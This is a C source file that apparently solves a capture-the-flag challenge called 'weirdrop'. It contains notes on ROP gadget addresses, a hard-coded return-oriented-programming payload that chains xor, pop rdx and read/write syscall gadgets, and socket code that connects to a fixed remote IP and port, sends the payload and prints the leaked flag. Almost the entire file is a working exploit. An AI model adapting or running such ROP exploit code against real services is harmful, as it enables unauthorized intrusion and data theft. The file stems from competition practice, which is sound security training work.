#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

/* notes
 *
 * 0x401000 pop rsi
 * 0x401002 mov rax, 0
 * 0x40100a mov rax, 1
 * 0x401012 mov rdi, 1
 * 0x4010db syscall
 *

 * 0x40101a xor rdi, 0x56
 * 0x40107c xor rdi, 0x53
 * 0x40101f xor rdi, 0x25
 * 0x401024 xor rdi, 0x32e
 * 0x40102c xor rdi, 0x188
 * 0x401034 xor rdi, 0x1e5
 * 0x40103c xor rdi, 0x355
 * 0x401044 xor rdi, 0x30c
 * 0x40104c xor rdi, 0x19b
 * 0x401054 xor rdi, 0x237
 * 0x40105c xor rdi, 0x314
 * 0x401064 xor rdi, 0xc1
 * 0x40106c xor rdi, 0x2b3
 * 0x401074 xor rdi, 0x281
 * 0x401081 xor rdi, 0x274
 * 0x401089 xor rdi, 0x1d
 * 0x40108e xor rdi, 0x1a9
 * 0x401096 xor rdi, 0x6f
 * 0x40109b xor rdi, 0x3cd
 * 0x4010a3 xor rdi, 0x28e
 * 0x4010ab xor rdi, 0x16b
 * 0x4010b3 xor rdi, 0x1f4
 * 0x4010bb xor rdi, 0x3ab
 * 0x4010c3 xor rdi, 0x198
 * 0x4010cb xor rdi, 0x1a3
 * 0x4010d3 xor rdi, 0x29a
 * 0x4010de pop rdx
 *
 *  the goal here is to use rop to get rdi to the
 *  value == fd
 */

#define EXPLOIT_LEN     0xc8

uint8_t exploit[EXPLOIT_LEN] = {
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // it's in your head!
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // it's in your head!
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // filler!
    0x7c, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // xor rdi, 0x53
    0x1a, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // xor rdi, 0x56
    0xde, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // pop rdx
    0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // length value
    0x02, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0
    0xdb, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // syscall
    0x0a, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x1
    0x12, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdi, 0x1
    0xdb, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // syscall
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // gadget
};

#define HOST            "35.224.135.84"
#define PORT            1000

int recv_until(int sock, unsigned char until)
{
    int rd;
    unsigned char c;

    while (1) {
        if ((rd = read(sock, &c, 1)) == 1) {
            putchar(c);
            if (c == until) return 1;
        } else {
            if (!rd) fprintf(stderr, "EOF received\n");
            else fprintf(stderr, "read: %s\n", strerror(errno));
            return 0;
        }
    }
}

int connect_to_server(void)
{
    int sock;
    struct sockaddr_in targ;

    memset(&targ, 0, sizeof(struct sockaddr));

    targ.sin_port = htons(PORT);
    targ.sin_family = AF_INET;

    if ((sock = socket(targ.sin_family, SOCK_STREAM, 0)) == -1) {
        fprintf(stderr, "socket: %s\n", strerror(errno));
        return -1;
    }

    if (inet_pton(AF_INET, HOST, (void*)&targ.sin_addr) != 1) {
        fprintf(stderr, "inet_pton fucked up\n");
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&targ, sizeof(targ)) == -1) {
        fprintf(stderr, "connect: %s\n", strerror(errno));
        return -1;
    }
    return sock;
}

int main(int argc, char **argv)
{
    char tmp[2];
    int sock, remote_fd;
    if ((sock = connect_to_server()) == -1) return 1;

    if (read(sock, &tmp, 2) < 0) {
        fprintf(stderr, "read: %s\n", strerror(errno));
        goto done;
    }

    remote_fd = (int)(tmp[0] - 0x30);

    if (tmp[1] != 0xa) {
        fprintf(stderr, "something weird happened, bye!\n");
        goto done;
    }

    // printf("Remote fd: %d\n", remote_fd);
    // The fd is going to stay the same

    if (write(sock, exploit, EXPLOIT_LEN) < 0) {
        fprintf(stderr, "write: %s\n", strerror(errno));
        goto done;
    }

    recv_until(sock, '}');
    putchar(0xa);

    // [acidb@copelandos weirdrop]$ ./exploit
//CCC{math_is_hard_1234897}

done:
    close(sock);
    return 0;
}
